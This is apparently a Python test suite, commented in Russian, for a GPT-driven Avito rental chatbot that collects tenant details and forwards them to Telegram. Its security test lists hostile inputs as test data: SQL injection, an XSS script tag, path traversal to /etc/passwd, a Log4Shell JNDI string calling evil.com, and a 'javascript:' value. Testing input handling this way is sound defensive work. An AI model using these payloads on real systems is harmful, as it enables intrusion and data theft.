#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Комплексный скрипт тестирования Avito Rental Bot
Проверяет все компоненты системы перед развертыванием в продакшен
"""

import asyncio
import aiohttp
import json
import sys
import os
import time
from datetime import datetime, timedelta, timezone
from unittest.mock import AsyncMock, MagicMock, patch
import tempfile
import traceback

# Цвета для консоли
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class TestResult:
    def __init__(self):
        self.passed = 0
        self.failed = 0
        self.warnings = 0
        self.errors = []
        
    def add_pass(self, test_name):
        self.passed += 1
        print(f"{Colors.GREEN}✓{Colors.END} {test_name}")
        
    def add_fail(self, test_name, error=None):
        self.failed += 1
        error_msg = f": {error}" if error else ""
        print(f"{Colors.RED}✗{Colors.END} {test_name}{error_msg}")
        if error:
            self.errors.append(f"{test_name}: {error}")
            
    def add_warning(self, test_name, warning):
        self.warnings += 1
        print(f"{Colors.YELLOW}⚠{Colors.END} {test_name}: {warning}")
        
    def print_summary(self):
        total = self.passed + self.failed
        print(f"\n{Colors.BOLD}=== РЕЗУЛЬТАТЫ ТЕСТИРОВАНИЯ ==={Colors.END}")
        print(f"{Colors.GREEN}Пройдено: {self.passed}{Colors.END}")
        print(f"{Colors.RED}Не пройдено: {self.failed}{Colors.END}")
        print(f"{Colors.YELLOW}Предупреждения: {self.warnings}{Colors.END}")
        print(f"Всего тестов: {total}")
        
        if self.failed > 0:
            print(f"\n{Colors.RED}ОШИБКИ:{Colors.END}")
            for error in self.errors:
                print(f"  - {error}")
                
        success_rate = (self.passed / total * 100) if total > 0 else 0
        if success_rate >= 90:
            print(f"\n{Colors.GREEN}Система готова к продакшену! ({success_rate:.1f}%){Colors.END}")
        elif success_rate >= 70:
            print(f"\n{Colors.YELLOW}Система требует доработки ({success_rate:.1f}%){Colors.END}")
        else:
            print(f"\n{Colors.RED}Система НЕ готова к продакшену ({success_rate:.1f}%){Colors.END}")

class AvitoRentalBotTester:
    def __init__(self):
        self.result = TestResult()
        self.test_data = self._load_test_data()
        
    def _load_test_data(self):
        """Тестовые данные для различных сценариев"""
        return {
            "mock_messages": [
                {
                    "id": 1,
                    "direction": "in",
                    "type": "text",
                    "created": int(time.time()) - 100,
                    "author_id": 12345,
                    "content": {"text": "Здравствуйте, интересует квартира"}
                },
                {
                    "id": 2,
                    "direction": "out", 
                    "type": "text",
                    "created": int(time.time()) - 90,
                    "author_id": 0,
                    "content": {"text": "Здравствуйте, на связи Светлана, АН Skyline"}
                }
            ],
            "mock_chats": [
                {
                    "id": "test_chat_1",
                    "context": {
                        "value": {
                            "title": "2-к квартира, 60 м², 5/9 эт.",
                            "price_string": "45 000 ₽",
                            "location": {
                                "title": "Москва",
                                "lat": 55.7558,
                                "lon": 37.6176
                            }
                        }
                    }
                }
            ],
            "dialog_samples": {
                "complete": """Клиент: Здравствуйте, интересует квартира
Светлана: Здравствуйте, на связи Светлана, АН Skyline
Расскажите, пожалуйста, кто проживать планирует
Клиент: Буду жить я один, мужчина 28 лет
Светлана: Дети планируются?
Клиент: Нет детей
Светлана: Животные есть?
Клиент: Нет животных
Светлана: От скольки месяцев рассматриваете аренду?
Клиент: От 12 месяцев
Светлана: Когда планируете заезжать?
Клиент: С 1 сентября
Светлана: Как Вас зовут?
Клиент: Алексей
Светлана: Номер телефона для связи?
Клиент: +7 999 123 45 67
Светлана: Отлично, обсудим вас с собственницей, если одобрит, то свяжемся с Вами🤝 [COMPLETE]""",
                "incomplete": """Клиент: Здравствуйте, интересует квартира
Светлана: Здравствуйте, на связи Светлана, АН Skyline
Расскажите, пожалуйста, кто проживать планирует
Клиент: Буду жить я один""",
            },
            "client_data_sample": {
                "name": "Алексей",
                "phone": "+7 999 123 45 67",
                "residents_info": "мужчина 28 лет",
                "residents_count": 1,
                "residents_details": "мужчина 28 лет",
                "has_children": False,
                "children_details": None,
                "has_pets": False, 
                "pets_details": None,
                "rental_period": "от 12 месяцев",
                "move_in_deadline": "с 1 сентября"
            }
        }

    def print_header(self, title):
        """Печать заголовка раздела тестов"""
        print(f"\n{Colors.CYAN}=== {title} ==={Colors.END}")

    async def test_config_validation(self):
        """Тестирование конфигурации"""
        self.print_header("ТЕСТИРОВАНИЕ КОНФИГУРАЦИИ")
        
        try:
            from config import (
                OPENAI_API_KEY, OPENAI_MODEL, AVITO_USER_ID, 
                AVITO_CLIENT_ID, AVITO_CLIENT_SECRET, TELEGRAM_BOT_TOKEN,
                TELEGRAM_CHAT_ID, SYSTEM_PROMPT, EXTRACTION_PROMPT_TEMPLATE
            )
            
            # Проверка API ключей
            if OPENAI_API_KEY == "ВАШ_АПИ_КЛЮЧ":
                self.result.add_fail("OpenAI API ключ", "Не настроен")
            else:
                self.result.add_pass("OpenAI API ключ настроен")
                
            if AVITO_CLIENT_ID == "КЛИЕНТ_АЙДИ":
                self.result.add_fail("Avito Client ID", "Не настроен")
            else:
                self.result.add_pass("Avito Client ID настроен")
                
            if AVITO_CLIENT_SECRET == "СИКРЕТ_КЕЙ":
                self.result.add_fail("Avito Client Secret", "Не настроен")
            else:
                self.result.add_pass("Avito Client Secret настроен")
                
            if TELEGRAM_BOT_TOKEN == "ТОКЕН_БОТА":
                self.result.add_fail("Telegram Bot Token", "Не настроен")
            else:
                self.result.add_pass("Telegram Bot Token настроен")
                
            # Проверка типов данных
            if isinstance(AVITO_USER_ID, int) and AVITO_USER_ID > 0:
                self.result.add_pass("Avito User ID корректен")
            else:
                self.result.add_fail("Avito User ID", "Должен быть положительным числом")
                
            # Проверка промптов
            if len(SYSTEM_PROMPT) > 100:
                self.result.add_pass("Системный промпт присутствует")
            else:
                self.result.add_fail("Системный промпт", "Слишком короткий или отсутствует")
                
            if "{dialog_history}" in EXTRACTION_PROMPT_TEMPLATE:
                self.result.add_pass("Промпт извлечения данных корректен")
            else:
                self.result.add_fail("Промпт извлечения данных", "Отсутствует плейсхолдер {dialog_history}")
                
        except ImportError as e:
            self.result.add_fail("Импорт конфигурации", str(e))

    async def test_avito_client(self):
        """Тестирование Avito API клиента"""
        self.print_header("ТЕСТИРОВАНИЕ AVITO API КЛИЕНТА")
        
        try:
            from avito import AvitoClient
            
            # Создание клиента
            client = AvitoClient("test_user", "test_client", "test_secret")
            self.result.add_pass("Создание AvitoClient")
            
            # Тест с мок-данными
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_response = AsyncMock()
                mock_response.status = 200
                mock_response.json.return_value = {"access_token": "test_token"}
                mock_post.return_value.__aenter__.return_value = mock_response
                
                await client._get_token()
                if client.access_token == "test_token":
                    self.result.add_pass("Получение токена")
                else:
                    self.result.add_fail("Получение токена", "Токен не установлен")
                    
            # Тест получения чатов
            with patch('aiohttp.ClientSession.get') as mock_get:
                mock_response = AsyncMock()
                mock_response.json.return_value = {"chats": self.test_data["mock_chats"]}
                mock_get.return_value.__aenter__.return_value = mock_response
                
                client.session = AsyncMock()
                client.session.get.return_value.__aenter__.return_value = mock_response
                
                chats = await client.get_chats()
                if isinstance(chats, list) and len(chats) > 0:
                    self.result.add_pass("Получение списка чатов")
                else:
                    self.result.add_fail("Получение списка чатов", "Некорректный формат ответа")
                    
        except Exception as e:
            self.result.add_fail("Тестирование AvitoClient", str(e))

    async def test_openai_integration(self):
        """Тестирование интеграции с OpenAI"""
        self.print_header("ТЕСТИРОВАНИЕ OPENAI ИНТЕГРАЦИИ")
        
        try:
            from chat_gpt import ChatGPTHandler, get_agent_response, extract_final_client_data
            
            # Создание хендлера
            handler = ChatGPTHandler("test_key", "gpt-4o-mini")
            self.result.add_pass("Создание ChatGPTHandler")
            
            # Тест с мок-ответом
            with patch.object(handler, '_make_request') as mock_request:
                mock_request.return_value = "Здравствуйте, на связи Светлана, АН Skyline"
                
                response = await handler.generate_response("test dialog", True)
                if response and "Светлана" in response:
                    self.result.add_pass("Генерация ответа агента")
                else:
                    self.result.add_fail("Генерация ответа агента", "Некорректный ответ")
                    
            # Тест извлечения данных
            with patch.object(handler, '_make_request') as mock_request:
                mock_request.return_value = json.dumps(self.test_data["client_data_sample"])
                
                client_data = await handler.extract_client_data(self.test_data["dialog_samples"]["complete"])
                if client_data and "name" in client_data:
                    self.result.add_pass("Извлечение данных клиента")
                else:
                    self.result.add_fail("Извлечение данных клиента", "Данные не извлечены")
                    
            # Тест проверки завершенности
            complete_response = "Отлично, обсудим вас с собственницей [COMPLETE]"
            incomplete_response = "Расскажите, пожалуйста, кто проживать планирует"
            
            if handler.is_dialog_complete(complete_response):
                self.result.add_pass("Определение завершенного диалога")
            else:
                self.result.add_fail("Определение завершенного диалога", "Не распознан маркер завершения")
                
            if not handler.is_dialog_complete(incomplete_response):
                self.result.add_pass("Определение незавершенного диалога")
            else:
                self.result.add_fail("Определение незавершенного диалога", "Ложное срабатывание")
                
        except Exception as e:
            self.result.add_fail("Тестирование OpenAI интеграции", str(e))

    async def test_telegram_integration(self):
        """Тестирование интеграции с Telegram"""
        self.print_header("ТЕСТИРОВАНИЕ TELEGRAM ИНТЕГРАЦИИ")
        
        try:
            from telegram import TelegramBot, send_completed_application
            
            # Создание бота
            bot = TelegramBot("test_token")
            self.result.add_pass("Создание TelegramBot")
            
            # Тест отправки сообщения
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_response = AsyncMock()
                mock_response.status = 200
                mock_post.return_value.__aenter__.return_value = mock_response
                
                success = await bot.send_message("test_chat", "test message")
                if success:
                    self.result.add_pass("Отправка сообщения в Telegram")
                else:
                    self.result.add_fail("Отправка сообщения в Telegram")
                    
            # Тест форматирования заявки
            with patch.object(bot, 'send_message') as mock_send:
                mock_send.return_value = True
                
                success = await bot.send_client_info(
                    self.test_data["client_data_sample"], 
                    "test_chat",
                    self.test_data["mock_chats"][0]["context"]["value"]
                )
                
                if success and mock_send.called:
                    # Проверяем что сообщение содержит нужные поля
                    call_args = mock_send.call_args[0]
                    message_text = call_args[1]
                    
                    required_fields = ["НОВАЯ ЗАЯВКА", "Алексей", "+7 999 123 45 67"]
                    if all(field in message_text for field in required_fields):
                        self.result.add_pass("Форматирование заявки клиента")
                    else:
                        self.result.add_fail("Форматирование заявки клиента", "Отсутствуют обязательные поля")
                else:
                    self.result.add_fail("Отправка заявки клиента")
                    
        except Exception as e:
            self.result.add_fail("Тестирование Telegram интеграции", str(e))

    async def test_main_bot_logic(self):
        """Тестирование основной логики бота"""
        self.print_header("ТЕСТИРОВАНИЕ ОСНОВНОЙ ЛОГИКИ БОТА")
        
        try:
            from main import AvitoRentalBot
            
            # Создание бота
            bot = AvitoRentalBot()
            self.result.add_pass("Создание основного бота")
            
            # Тест определения времени МСК
            moscow_time = bot.get_moscow_time()
            if moscow_time.tzinfo is not None:
                self.result.add_pass("Получение времени МСК")
            else:
                self.result.add_fail("Получение времени МСК", "Отсутствует timezone")
                
            # Тест проверки рабочего времени
            work_time = moscow_time.replace(hour=12, minute=0)  # 12:00 - рабочее время
            non_work_time = moscow_time.replace(hour=23, minute=0)  # 23:00 - нерабочее время
            
            if bot.is_work_time(work_time) and not bot.is_work_time(non_work_time):
                self.result.add_pass("Проверка рабочего времени")
            else:
                self.result.add_fail("Проверка рабочего времени", "Некорректное определение")
                
            # Тест форматирования диалога
            formatted = bot.format_dialog_history(self.test_data["mock_messages"])
            if "Клиент:" in formatted and "Светлана:" in formatted:
                self.result.add_pass("Форматирование истории диалога")
            else:
                self.result.add_fail("Форматирование истории диалога", "Некорректный формат")
                
            # Тест определения этапа диалога
            stage = bot.determine_dialog_stage(self.test_data["mock_messages"])
            if stage in ["greeting", "residents", "children", "pets", "rental_period", "deadline", "contacts", "complete"]:
                self.result.add_pass("Определение этапа диалога")
            else:
                self.result.add_fail("Определение этапа диалога", f"Неизвестный этап: {stage}")
                
            # Тест проверки завершенности диалога
            complete_messages = [
                {"direction": "in", "type": "text", "content": {"text": "Алексей"}, "author_id": 123},
                {"direction": "in", "type": "text", "content": {"text": "+7 999 123 45 67"}, "author_id": 123},
                {"direction": "in", "type": "text", "content": {"text": "буду жить один"}, "author_id": 123},
                {"direction": "in", "type": "text", "content": {"text": "от 12 месяцев"}, "author_id": 123},
                {"direction": "in", "type": "text", "content": {"text": "с 1 сентября"}, "author_id": 123}
            ]
            
            if bot.is_dialog_complete_check(complete_messages):
                self.result.add_pass("Проверка завершенности диалога")
            else:
                self.result.add_fail("Проверка завершенности диалога", "Не распознан завершенный диалог")
                
            # Тест расчета follow-up времени
            base_time = time.time()
            next_time = bot.calculate_next_followup_time(base_time, 3600)  # +1 час
            if next_time > base_time:
                self.result.add_pass("Расчет времени follow-up")
            else:
                self.result.add_fail("Расчет времени follow-up", "Некорректное время")
                
        except Exception as e:
            self.result.add_fail("Тестирование основной логики", str(e))

    async def test_prompts_quality(self):
        """Тестирование качества промптов"""
        self.print_header("ТЕСТИРОВАНИЕ КАЧЕСТВА ПРОМПТОВ")
        
        try:
            from config import SYSTEM_PROMPT, EXTRACTION_PROMPT_TEMPLATE, FORBIDDEN_PHRASES
            
            # Проверка системного промпта
            required_elements = [
                "Светлана", "агент", "аренде", "АН", "Skyline",
                "7 пунктов", "состав", "дети", "животные", "срок", "дата", "телефон"
            ]
            
            missing_elements = [elem for elem in required_elements if elem.lower() not in SYSTEM_PROMPT.lower()]
            if not missing_elements:
                self.result.add_pass("Системный промпт содержит все ключевые элементы")
            else:
                self.result.add_fail("Системный промпт", f"Отсутствуют элементы: {missing_elements}")
                
            # Проверка запрещенных фраз
            forbidden_found = [phrase for phrase in FORBIDDEN_PHRASES if phrase in SYSTEM_PROMPT.lower()]
            if not forbidden_found:
                self.result.add_pass("Системный промпт не содержит запрещенных фраз")
            else:
                self.result.add_warning("Системный промпт", f"Содержит запрещенные фразы: {forbidden_found}")
                
            # Проверка промпта извлечения
            extraction_elements = ["{dialog_history}", "JSON", "name", "phone", "residents"]
            missing_extraction = [elem for elem in extraction_elements if elem not in EXTRACTION_PROMPT_TEMPLATE]
            
            if not missing_extraction:
                self.result.add_pass("Промпт извлечения содержит все элементы")
            else:
                self.result.add_fail("Промпт извлечения", f"Отсутствуют: {missing_extraction}")
                
        except Exception as e:
            self.result.add_fail("Тестирование промптов", str(e))

    async def test_error_handling(self):
        """Тестирование обработки ошибок"""
        self.print_header("ТЕСТИРОВАНИЕ ОБРАБОТКИ ОШИБОК")
        
        try:
            from chat_gpt import ChatGPTHandler
            from telegram import TelegramBot
            
            # Тест обработки ошибок API
            handler = ChatGPTHandler("invalid_key")
            
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_response = AsyncMock()
                mock_response.status = 401  # Unauthorized
                mock_response.text.return_value = "Unauthorized"
                mock_post.return_value.__aenter__.return_value = mock_response
                
                result = await handler._make_request([{"role": "user", "content": "test"}])
                if result is None:
                    self.result.add_pass("Обработка ошибки OpenAI API")
                else:
                    self.result.add_fail("Обработка ошибки OpenAI API", "Ошибка не обработана")
                    
            # Тест обработки невалидного JSON
            with patch.object(handler, '_make_request') as mock_request:
                mock_request.return_value = "invalid json response"
                
                client_data = await handler.extract_client_data("test dialog")
                if client_data is None:
                    self.result.add_pass("Обработка невалидного JSON")
                else:
                    self.result.add_fail("Обработка невалидного JSON", "Ошибка не обработана")
                    
            # Тест обработки ошибок Telegram
            bot = TelegramBot("invalid_token")
            
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_response = AsyncMock()
                mock_response.status = 403  # Forbidden
                mock_post.return_value.__aenter__.return_value = mock_response
                
                success = await bot.send_message("test_chat", "test")
                if not success:
                    self.result.add_pass("Обработка ошибки Telegram API")
                else:
                    self.result.add_fail("Обработка ошибки Telegram API", "Ошибка не обработана")
                    
        except Exception as e:
            self.result.add_fail("Тестирование обработки ошибок", str(e))

    async def test_performance(self):
        """Тестирование производительности"""
        self.print_header("ТЕСТИРОВАНИЕ ПРОИЗВОДИТЕЛЬНОСТИ")
        
        try:
            from main import AvitoRentalBot
            
            bot = AvitoRentalBot()
            
            # Тест скорости обработки сообщений
            start_time = time.time()
            for _ in range(100):
                bot.format_dialog_history(self.test_data["mock_messages"])
            end_time = time.time()
            
            processing_time = (end_time - start_time) / 100
            if processing_time < 0.01:  # Менее 10мс на сообщение
                self.result.add_pass("Скорость обработки сообщений")
            else:
                self.result.add_warning("Скорость обработки сообщений", f"{processing_time*1000:.1f}мс на сообщение")
                
            # Тест использования памяти
            import psutil
            process = psutil.Process()
            memory_mb = process.memory_info().rss / 1024 / 1024
            
            if memory_mb < 100:  # Менее 100MB
                self.result.add_pass("Использование памяти")
            elif memory_mb < 200:
                self.result.add_warning("Использование памяти", f"{memory_mb:.1f}MB")
            else:
                self.result.add_fail("Использование памяти", f"{memory_mb:.1f}MB - слишком много")
                
        except ImportError:
            self.result.add_warning("Тестирование производительности", "psutil не установлен")
        except Exception as e:
            self.result.add_fail("Тестирование производительности", str(e))

    async def test_integration_flow(self):
        """Тестирование полного интеграционного потока"""
        self.print_header("ТЕСТИРОВАНИЕ ИНТЕГРАЦИОННОГО ПОТОКА")
        
        try:
            from main import AvitoRentalBot
            from avito import AvitoClient
            
            # Создаем бота
            bot = AvitoRentalBot()
            
            # Мокаем все внешние API
            with patch('aiohttp.ClientSession') as mock_session_class:
                mock_session = AsyncMock()
                mock_session_class.return_value = mock_session
                
                # Мок для Avito API
                mock_avito_response = AsyncMock()
                mock_avito_response.status = 200
                mock_avito_response.json.return_value = {
                    "access_token": "test_token"
                }
                mock_session.post.return_value.__aenter__.return_value = mock_avito_response
                
                mock_chats_response = AsyncMock()
                mock_chats_response.json.return_value = {"chats": self.test_data["mock_chats"]}
                mock_session.get.return_value.__aenter__.return_value = mock_chats_response
                
                # Мок для OpenAI API
                with patch('chat_gpt.get_agent_response') as mock_gpt:
                    mock_gpt.return_value = "Здравствуйте, на связи Светлана, АН Skyline"
                    
                    # Мок для Telegram API
                    with patch('telegram.send_completed_application') as mock_telegram:
                        mock_telegram.return_value = True
                        
                        # Создаем клиента и пытаемся обработать чат
                        async with AvitoClient("test_user", "test_client", "test_secret") as client:
                            await bot.process_chat(client, "test_chat_1", self.test_data["mock_chats"][0])
                            
                        self.result.add_pass("Интеграционный поток выполнен")
                        
        except Exception as e:
            self.result.add_fail("Интеграционный поток", str(e))

    async def test_security(self):
        """Тестирование безопасности"""
        self.print_header("ТЕСТИРОВАНИЕ БЕЗОПАСНОСТИ")
        
        try:
            from config import OPENAI_API_KEY, TELEGRAM_BOT_TOKEN, AVITO_CLIENT_SECRET
            
            # Проверка на захардкоженные секреты
            secrets_ok = True
            
            if OPENAI_API_KEY and len(OPENAI_API_KEY) > 10 and "test" not in OPENAI_API_KEY.lower():
                if OPENAI_API_KEY != "ВАШ_АПИ_КЛЮЧ":
                    self.result.add_warning("OpenAI API ключ", "Убедитесь что ключ не попадет в репозиторий")
                else:
                    self.result.add_pass("OpenAI API ключ использует плейсхолдер")
            
            # Проверка входных данных на SQL injection и XSS
            from main import AvitoRentalBot
            bot = AvitoRentalBot()
            
            malicious_inputs = [
                "'; DROP TABLE users; --",
                "<script>alert('xss')</script>",
                "../../etc/passwd",
                "${jndi:ldap://evil.com/x}"
            ]
            
            for malicious_input in malicious_inputs:
                test_message = {
                    "direction": "in",
                    "type": "text", 
                    "content": {"text": malicious_input},
                    "author_id": 123,
                    "created": int(time.time())
                }
                
                try:
                    # Тестируем что малициозный ввод не вызывает исключений
                    formatted = bot.format_dialog_history([test_message])
                    if malicious_input in formatted:
                        self.result.add_pass("Обработка потенциально опасного ввода")
                    else:
                        self.result.add_warning("Фильтрация ввода", "Ввод был изменен")
                except Exception:
                    self.result.add_fail("Безопасность ввода", "Исключение при обработке малициозного ввода")
                    
            # Проверка валидации номеров телефонов
            from config import MIN_PHONE_DIGITS
            
            test_phones = [
                "+7 999 123 45 67",  # Валидный
                "123",               # Слишком короткий
                "+7 (999) 123-45-67", # С форматированием
                "javascript:alert(1)" # Потенциально опасный
            ]
            
            valid_count = 0
            for phone in test_phones:
                digits_count = len([c for c in phone if c.isdigit()])
                if digits_count >= MIN_PHONE_DIGITS:
                    valid_count += 1
                    
            if valid_count >= 2:  # Как минимум 2 из 4 должны пройти валидацию
                self.result.add_pass("Валидация номеров телефонов")
            else:
                self.result.add_fail("Валидация номеров телефонов", "Слишком строгая или слабая валидация")
                
        except Exception as e:
            self.result.add_fail("Тестирование безопасности", str(e))

    async def test_deployment_readiness(self):
        """Тестирование готовности к развертыванию"""
        self.print_header("ТЕСТИРОВАНИЕ ГОТОВНОСТИ К РАЗВЕРТЫВАНИЮ")
        
        try:
            # Проверка наличия всех файлов
            required_files = [
                "main.py", "config.py", "avito.py", 
                "chat_gpt.py", "telegram.py", "deploy.sh"
            ]
            
            missing_files = []
            for file in required_files:
                if not os.path.exists(file):
                    missing_files.append(file)
                    
            if not missing_files:
                self.result.add_pass("Все необходимые файлы присутствуют")
            else:
                self.result.add_fail("Отсутствующие файлы", str(missing_files))
                
            # Проверка синтаксиса Python файлов
            python_files = [f for f in required_files if f.endswith('.py')]
            syntax_errors = []
            
            for file in python_files:
                if os.path.exists(file):
                    try:
                        with open(file, 'r', encoding='utf-8') as f:
                            code = f.read()
                        compile(code, file, 'exec')
                    except SyntaxError as e:
                        syntax_errors.append(f"{file}: {e}")
                        
            if not syntax_errors:
                self.result.add_pass("Синтаксис Python файлов корректен")
            else:
                self.result.add_fail("Синтаксические ошибки", str(syntax_errors))
                
            # Проверка прав на выполнение deploy.sh
            if os.path.exists("deploy.sh"):
                if os.access("deploy.sh", os.X_OK):
                    self.result.add_pass("deploy.sh имеет права на выполнение")
                else:
                    self.result.add_warning("deploy.sh", "Нет прав на выполнение (chmod +x deploy.sh)")
                    
            # Проверка зависимостей
            try:
                import aiohttp
                self.result.add_pass("aiohttp установлен")
            except ImportError:
                self.result.add_fail("Зависимости", "aiohttp не установлен")
                
            try:
                import asyncio
                self.result.add_pass("asyncio доступен")
            except ImportError:
                self.result.add_fail("Зависимости", "asyncio не доступен")
                
            # Проверка размера файлов (не должны быть слишком большими)
            large_files = []
            for file in python_files:
                if os.path.exists(file):
                    size_mb = os.path.getsize(file) / 1024 / 1024
                    if size_mb > 1:  # Больше 1MB
                        large_files.append(f"{file}: {size_mb:.1f}MB")
                        
            if not large_files:
                self.result.add_pass("Размеры файлов в норме")
            else:
                self.result.add_warning("Большие файлы", str(large_files))
                
        except Exception as e:
            self.result.add_fail("Тестирование готовности к развертыванию", str(e))

    async def test_monitoring_and_logging(self):
        """Тестирование мониторинга и логирования"""
        self.print_header("ТЕСТИРОВАНИЕ МОНИТОРИНГА И ЛОГИРОВАНИЯ")
        
        try:
            from main import AvitoRentalBot
            
            # Тест что бот выводит логи
            import io
            import sys
            
            # Перехватываем stdout
            captured_output = io.StringIO()
            sys.stdout = captured_output
            
            try:
                bot = AvitoRentalBot()
                print("Test log message")
                
                # Возвращаем stdout
                sys.stdout = sys.__stdout__
                
                output = captured_output.getvalue()
                if "Test log message" in output:
                    self.result.add_pass("Логирование работает")
                else:
                    self.result.add_fail("Логирование", "Логи не выводятся")
                    
            finally:
                sys.stdout = sys.__stdout__
                
            # Проверка структуры логов
            test_messages = [
                "Получено сообщение:",
                "Отправлен ответ:",
                "Диалог завершен:",
                "Follow-up отправлен:"
            ]
            
            # Эти сообщения должны присутствовать в коде для правильного мониторинга
            main_code = ""
            if os.path.exists("main.py"):
                with open("main.py", 'r', encoding='utf-8') as f:
                    main_code = f.read()
                    
            missing_logs = []
            for message in test_messages:
                if message not in main_code:
                    missing_logs.append(message)
                    
            if not missing_logs:
                self.result.add_pass("Структура логирования корректна")
            else:
                self.result.add_warning("Структура логов", f"Отсутствуют: {missing_logs}")
                
            # Проверка обработки исключений с логированием
            exception_patterns = ["try:", "except", "print(f\"Error", "print(f\"Ошибка"]
            has_error_handling = any(pattern in main_code for pattern in exception_patterns)
            
            if has_error_handling:
                self.result.add_pass("Обработка ошибок с логированием")
            else:
                self.result.add_fail("Обработка ошибок", "Недостаточно try/except блоков")
                
        except Exception as e:
            self.result.add_fail("Тестирование мониторинга", str(e))

    async def run_load_test(self):
        """Нагрузочное тестирование"""
        self.print_header("НАГРУЗОЧНОЕ ТЕСТИРОВАНИЕ")
        
        try:
            from main import AvitoRentalBot
            
            bot = AvitoRentalBot()
            
            # Тест обработки множественных чатов
            start_time = time.time()
            
            # Создаем много тестовых чатов
            test_chats = []
            for i in range(50):
                chat_data = {
                    "id": f"chat_{i}",
                    "context": {"value": {"title": f"Квартира {i}"}}
                }
                test_chats.append(chat_data)
                
            # Мокаем внешние API для нагрузочного теста
            with patch('chat_gpt.get_agent_response') as mock_gpt, \
                 patch('telegram.send_completed_application') as mock_telegram:
                
                mock_gpt.return_value = "Тестовый ответ"
                mock_telegram.return_value = True
                
                # Обрабатываем все чаты
                processed = 0
                for chat_data in test_chats:
                    try:
                        # Имитируем быструю обработку
                        bot.chat_states[chat_data["id"]] = []
                        processed += 1
                    except Exception:
                        pass
                        
            end_time = time.time()
            processing_time = end_time - start_time
            
            if processed >= 45:  # 90% успешно обработано
                self.result.add_pass(f"Нагрузочный тест ({processed}/50 чатов за {processing_time:.1f}с)")
            else:
                self.result.add_fail("Нагрузочный тест", f"Обработано только {processed}/50 чатов")
                
            # Тест памяти при большом количестве состояний
            initial_states = len(bot.chat_states)
            
            # Добавляем много состояний
            for i in range(1000):
                bot.chat_states[f"load_test_{i}"] = [f"message_{j}" for j in range(10)]
                
            final_states = len(bot.chat_states)
            
            if final_states >= initial_states + 900:  # 90% состояний сохранено
                self.result.add_pass("Управление состояниями при нагрузке")
            else:
                self.result.add_fail("Управление состояниями", "Потеря состояний при нагрузке")
                
        except Exception as e:
            self.result.add_fail("Нагрузочное тестирование", str(e))

    async def run_all_tests(self):
        """Запуск всех тестов"""
        print(f"{Colors.BOLD}{Colors.BLUE}")
        print("╔═══════════════════════════════════════════════════════════════════════════════╗")
        print("║                        AVITO RENTAL BOT TEST SUITE                           ║")
        print("║                     Comprehensive Production Testing                         ║")
        print("╚═══════════════════════════════════════════════════════════════════════════════╝")
        print(f"{Colors.END}")
        
        # Список всех тестов
        tests = [
            ("Конфигурация", self.test_config_validation),
            ("Avito API", self.test_avito_client),
            ("OpenAI интеграция", self.test_openai_integration),
            ("Telegram интеграция", self.test_telegram_integration),
            ("Основная логика", self.test_main_bot_logic),
            ("Качество промптов", self.test_prompts_quality),
            ("Обработка ошибок", self.test_error_handling),
            ("Производительность", self.test_performance),
            ("Интеграционный поток", self.test_integration_flow),
            ("Безопасность", self.test_security),
            ("Готовность к развертыванию", self.test_deployment_readiness),
            ("Мониторинг и логирование", self.test_monitoring_and_logging),
            ("Нагрузочное тестирование", self.run_load_test)
        ]
        
        print(f"Запуск {len(tests)} групп тестов...\n")
        
        # Запускаем тесты
        for test_name, test_func in tests:
            try:
                await test_func()
            except Exception as e:
                self.result.add_fail(f"Критическая ошибка в {test_name}", str(e))
                print(f"{Colors.RED}Критическая ошибка в тестах '{test_name}': {e}{Colors.END}")
                traceback.print_exc()
                
        # Выводим итоги
        self.result.print_summary()
        
        # Генерируем отчет
        await self.generate_report()
        
        return self.result.failed == 0

    async def generate_report(self):
        """Генерация детального отчета"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            report_file = f"test_report_{timestamp}.txt"
            
            with open(report_file, 'w', encoding='utf-8') as f:
                f.write("AVITO RENTAL BOT - ОТЧЕТ О ТЕСТИРОВАНИИ\n")
                f.write("=" * 50 + "\n\n")
                f.write(f"Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Пройдено тестов: {self.result.passed}\n")
                f.write(f"Не пройдено тестов: {self.result.failed}\n")
                f.write(f"Предупреждения: {self.result.warnings}\n\n")
                
                if self.result.errors:
                    f.write("ОШИБКИ:\n")
                    f.write("-" * 20 + "\n")
                    for error in self.result.errors:
                        f.write(f"• {error}\n")
                    f.write("\n")
                
                # Рекомендации
                f.write("РЕКОМЕНДАЦИИ ДЛЯ ПРОДАКШЕНА:\n")
                f.write("-" * 30 + "\n")
                f.write("1. Убедитесь что все API ключи настроены корректно\n")
                f.write("2. Проверьте доступность внешних сервисов (OpenAI, Telegram, Avito)\n")
                f.write("3. Настройте мониторинг логов и метрик\n")
                f.write("4. Проведите тестирование на реальных данных\n")
                f.write("5. Настройте backup и восстановление состояний\n")
                f.write("6. Установите лимиты на ресурсы (CPU, память)\n")
                f.write("7. Настройте уведомления об ошибках\n")
                
            print(f"\n{Colors.CYAN}Детальный отчет сохранен: {report_file}{Colors.END}")
            
        except Exception as e:
            print(f"{Colors.RED}Ошибка генерации отчета: {e}{Colors.END}")

async def main():
    """Главная функция"""
    tester = AvitoRentalBotTester()
    
    try:
        success = await tester.run_all_tests()
        
        if success:
            print(f"\n{Colors.GREEN}{Colors.BOLD}🎉 ВСЕ ТЕСТЫ ПРОЙДЕНЫ! СИСТЕМА ГОТОВА К ПРОДАКШЕНУ! 🎉{Colors.END}")
            sys.exit(0)
        else:
            print(f"\n{Colors.RED}{Colors.BOLD}❌ ОБНАРУЖЕНЫ КРИТИЧЕСКИЕ ПРОБЛЕМЫ! СИСТЕМА НЕ ГОТОВА! ❌{Colors.END}")
            sys.exit(1)
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Тестирование прервано пользователем{Colors.END}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Colors.RED}Критическая ошибка тестирования: {e}{Colors.END}")
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    # Установка политики событий для Windows
    if sys.platform.startswith('win'):
